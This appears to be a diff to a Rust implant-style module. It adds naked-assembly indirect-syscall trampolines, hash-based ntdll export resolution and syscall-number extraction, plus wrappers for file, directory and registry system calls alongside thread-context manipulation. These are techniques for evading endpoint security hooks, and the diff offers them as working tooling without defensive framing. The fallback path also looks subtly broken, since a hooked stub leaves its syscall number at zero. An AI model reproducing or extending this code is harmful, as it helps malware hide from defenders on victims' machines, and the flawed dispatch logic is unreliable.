@@ -45,6 +45,50 @@ pub unsafe extern "system" fn indirect_syscall4(
     }
 }
 
+/// 6-argument variant: rcx, rdx, r8, r9 + 2 stack slots.
+/// SSN at [rsp+0x38], gadget at [rsp+0x40].
+///
+/// # Safety
+/// Same as `indirect_syscall4`.
+#[naked]
+pub unsafe extern "system" fn indirect_syscall6(
+    _a1: usize, _a2: usize, _a3: usize, _a4: usize,
+    _a5: usize, _a6: usize,
+    _ssn: u32, _gadget: usize,
+) -> i32 {
+    unsafe {
+        naked_asm!(
+            "mov r10, rcx",
+            "mov eax, [rsp + 0x38]",
+            "mov r11, [rsp + 0x40]",
+            "jmp r11",
+        );
+    }
+}
+
+/// 11-argument variant for NtCreateFile (rcx, rdx, r8, r9 + 7 stack slots).
+/// SSN at [rsp+0x60], gadget at [rsp+0x68].
+///
+/// # Safety
+/// `gadget` must be a valid `syscall; ret` in ntdll; ssn must match the
+/// canonical export for the OS build.
+#[naked]
+pub unsafe extern "system" fn indirect_syscall11(
+    _a1: usize, _a2: usize, _a3: usize, _a4: usize,
+    _a5: usize, _a6: usize, _a7: usize, _a8: usize,
+    _a9: usize, _a10: usize, _a11: usize,
+    _ssn: u32, _gadget: usize,
+) -> i32 {
+    unsafe {
+        naked_asm!(
+            "mov r10, rcx",
+            "mov eax, [rsp + 0x60]",
+            "mov r11, [rsp + 0x68]",
+            "jmp r11",
+        );
+    }
+}
+
 #[derive(Debug)]
 pub enum Error {
     NtdllNotFound,
@@ -59,6 +103,18 @@ pub struct Bootstrap {
     pub get_ctx_ssn: u32,
     pub set_ctx: *const u8,
     pub set_ctx_ssn: u32,
+    pub create_file: *const u8,
+    pub create_file_ssn: u32,
+    pub write_file: *const u8,
+    pub write_file_ssn: u32,
+    pub close: *const u8,
+    pub close_ssn: u32,
+    pub query_dir_file: *const u8,
+    pub query_dir_file_ssn: u32,
+    pub open_key: *const u8,
+    pub open_key_ssn: u32,
+    pub query_value_key: *const u8,
+    pub query_value_key_ssn: u32,
 }
 
 impl Bootstrap {
@@ -96,7 +152,49 @@ impl Bootstrap {
         };
         bdbg!(b"[bs] gadget found\n");
 
-        Ok(Bootstrap { ntdll, gadget, get_ctx, get_ctx_ssn, set_ctx, set_ctx_ssn })
+        bdbg!(b"[bs] resolve nt file/reg ssns\n");
+        let create_file = unsafe {
+            resolve_export(ntdll, hash!("NtCreateFile"))
+                .ok_or(Error::StubNotFound("NtCreateFile"))? as *const u8
+        };
+        let write_file = unsafe {
+            resolve_export(ntdll, hash!("NtWriteFile"))
+                .ok_or(Error::StubNotFound("NtWriteFile"))? as *const u8
+        };
+        let close = unsafe {
+            resolve_export(ntdll, hash!("NtClose"))
+                .ok_or(Error::StubNotFound("NtClose"))? as *const u8
+        };
+        let query_dir_file = unsafe {
+            resolve_export(ntdll, hash!("NtQueryDirectoryFile"))
+                .ok_or(Error::StubNotFound("NtQueryDirectoryFile"))? as *const u8
+        };
+        let open_key = unsafe {
+            resolve_export(ntdll, hash!("NtOpenKey"))
+                .ok_or(Error::StubNotFound("NtOpenKey"))? as *const u8
+        };
+        let query_value_key = unsafe {
+            resolve_export(ntdll, hash!("NtQueryValueKey"))
+                .ok_or(Error::StubNotFound("NtQueryValueKey"))? as *const u8
+        };
+        let create_file_ssn      = unsafe { extract_ssn(create_file).unwrap_or(0) };
+        let write_file_ssn       = unsafe { extract_ssn(write_file).unwrap_or(0) };
+        let close_ssn            = unsafe { extract_ssn(close).unwrap_or(0) };
+        let query_dir_file_ssn   = unsafe { extract_ssn(query_dir_file).unwrap_or(0) };
+        let open_key_ssn         = unsafe { extract_ssn(open_key).unwrap_or(0) };
+        let query_value_key_ssn  = unsafe { extract_ssn(query_value_key).unwrap_or(0) };
+
+        Ok(Bootstrap {
+            ntdll, gadget,
+            get_ctx, get_ctx_ssn,
+            set_ctx, set_ctx_ssn,
+            create_file, create_file_ssn,
+            write_file, write_file_ssn,
+            close, close_ssn,
+            query_dir_file, query_dir_file_ssn,
+            open_key, open_key_ssn,
+            query_value_key, query_value_key_ssn,
+        })
     }
 
     pub unsafe fn nt_get_context_thread(
@@ -132,6 +230,217 @@ impl Bootstrap {
                 indirect_syscall4(
                     thread as usize, context as usize, 0, 0,
                     self.set_ctx_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    /// Direct + indirect dispatch for NtCreateFile (11 args).
+    ///
+    /// # Safety
+    /// All pointer args must satisfy NtCreateFile's ABI contract.
+    #[allow(clippy::too_many_arguments)]
+    pub unsafe fn nt_create_file(
+        &self,
+        file_handle: *mut *mut core::ffi::c_void,
+        desired_access: u32,
+        object_attrs: *mut core::ffi::c_void,
+        io_status: *mut core::ffi::c_void,
+        alloc_size: *mut i64,
+        file_attrs: u32,
+        share_access: u32,
+        create_disposition: u32,
+        create_options: u32,
+        ea_buffer: *mut core::ffi::c_void,
+        ea_length: u32,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.create_file).is_some() {
+                type Fn = unsafe extern "system" fn(
+                    *mut *mut core::ffi::c_void, u32,
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    *mut i64, u32, u32, u32, u32,
+                    *mut core::ffi::c_void, u32,
+                ) -> i32;
+                let f: Fn = core::mem::transmute(self.create_file);
+                f(file_handle, desired_access, object_attrs, io_status,
+                  alloc_size, file_attrs, share_access, create_disposition,
+                  create_options, ea_buffer, ea_length)
+            } else {
+                indirect_syscall11(
+                    file_handle as usize, desired_access as usize,
+                    object_attrs as usize, io_status as usize,
+                    alloc_size as usize, file_attrs as usize,
+                    share_access as usize, create_disposition as usize,
+                    create_options as usize, ea_buffer as usize,
+                    ea_length as usize,
+                    self.create_file_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    /// NtWriteFile (9 args). Last 2 stack slots zeroed in the 11-arg trampoline path.
+    ///
+    /// # Safety
+    /// All pointer args must satisfy NtWriteFile's ABI.
+    #[allow(clippy::too_many_arguments)]
+    pub unsafe fn nt_write_file(
+        &self,
+        file: *mut core::ffi::c_void,
+        event: *mut core::ffi::c_void,
+        apc: *mut core::ffi::c_void,
+        apc_ctx: *mut core::ffi::c_void,
+        io_status: *mut core::ffi::c_void,
+        buffer: *const core::ffi::c_void,
+        length: u32,
+        byte_offset: *const i64,
+        key: *const u32,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.write_file).is_some() {
+                type Fn = unsafe extern "system" fn(
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    *mut core::ffi::c_void, *const core::ffi::c_void,
+                    u32, *const i64, *const u32,
+                ) -> i32;
+                let f: Fn = core::mem::transmute(self.write_file);
+                f(file, event, apc, apc_ctx, io_status, buffer,
+                  length, byte_offset, key)
+            } else {
+                indirect_syscall11(
+                    file as usize, event as usize,
+                    apc as usize, apc_ctx as usize,
+                    io_status as usize, buffer as usize,
+                    length as usize, byte_offset as usize,
+                    key as usize, 0, 0,
+                    self.write_file_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    /// NtClose — single arg.
+    ///
+    /// # Safety
+    /// `handle` must be a valid open handle.
+    pub unsafe fn nt_close(&self, handle: *mut core::ffi::c_void) -> i32 {
+        unsafe {
+            if extract_ssn(self.close).is_some() {
+                type Fn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+                let f: Fn = core::mem::transmute(self.close);
+                f(handle)
+            } else {
+                indirect_syscall4(
+                    handle as usize, 0, 0, 0,
+                    self.close_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    /// NtQueryDirectoryFile — 11 args.
+    ///
+    /// # Safety
+    /// All pointer args must satisfy NtQueryDirectoryFile's ABI.
+    #[allow(clippy::too_many_arguments)]
+    pub unsafe fn nt_query_directory_file(
+        &self,
+        file: *mut core::ffi::c_void,
+        event: *mut core::ffi::c_void,
+        apc: *mut core::ffi::c_void,
+        apc_ctx: *mut core::ffi::c_void,
+        io_status: *mut core::ffi::c_void,
+        buffer: *mut core::ffi::c_void,
+        length: u32,
+        info_class: u32,
+        return_single: u32,
+        file_name: *mut core::ffi::c_void,
+        restart_scan: u32,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.query_dir_file).is_some() {
+                type Fn = unsafe extern "system" fn(
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    u32, u32, u32,
+                    *mut core::ffi::c_void, u32,
+                ) -> i32;
+                let f: Fn = core::mem::transmute(self.query_dir_file);
+                f(file, event, apc, apc_ctx, io_status, buffer, length,
+                  info_class, return_single, file_name, restart_scan)
+            } else {
+                indirect_syscall11(
+                    file as usize, event as usize,
+                    apc as usize, apc_ctx as usize,
+                    io_status as usize, buffer as usize,
+                    length as usize, info_class as usize,
+                    return_single as usize, file_name as usize,
+                    restart_scan as usize,
+                    self.query_dir_file_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    /// NtOpenKey — 3 args.
+    ///
+    /// # Safety
+    /// `attrs` must satisfy OBJECT_ATTRIBUTES contract.
+    pub unsafe fn nt_open_key(
+        &self,
+        key_handle: *mut *mut core::ffi::c_void,
+        desired_access: u32,
+        attrs: *mut core::ffi::c_void,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.open_key).is_some() {
+                type Fn = unsafe extern "system" fn(
+                    *mut *mut core::ffi::c_void, u32,
+                    *mut core::ffi::c_void,
+                ) -> i32;
+                let f: Fn = core::mem::transmute(self.open_key);
+                f(key_handle, desired_access, attrs)
+            } else {
+                indirect_syscall4(
+                    key_handle as usize, desired_access as usize,
+                    attrs as usize, 0,
+                    self.open_key_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    /// NtQueryValueKey — 6 args.
+    ///
+    /// # Safety
+    /// Pointer args must satisfy NtQueryValueKey's ABI.
+    #[allow(clippy::too_many_arguments)]
+    pub unsafe fn nt_query_value_key(
+        &self,
+        key: *mut core::ffi::c_void,
+        value_name: *mut core::ffi::c_void,
+        info_class: u32,
+        info: *mut core::ffi::c_void,
+        info_length: u32,
+        result_length: *mut u32,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.query_value_key).is_some() {
+                type Fn = unsafe extern "system" fn(
+                    *mut core::ffi::c_void, *mut core::ffi::c_void,
+                    u32, *mut core::ffi::c_void, u32, *mut u32,
+                ) -> i32;
+                let f: Fn = core::mem::transmute(self.query_value_key);
+                f(key, value_name, info_class, info, info_length, result_length)
+            } else {
+                indirect_syscall6(
+                    key as usize, value_name as usize,
+                    info_class as usize, info as usize,
+                    info_length as usize, result_length as usize,
+                    self.query_value_key_ssn, self.gadget,
                 )
             }
         }
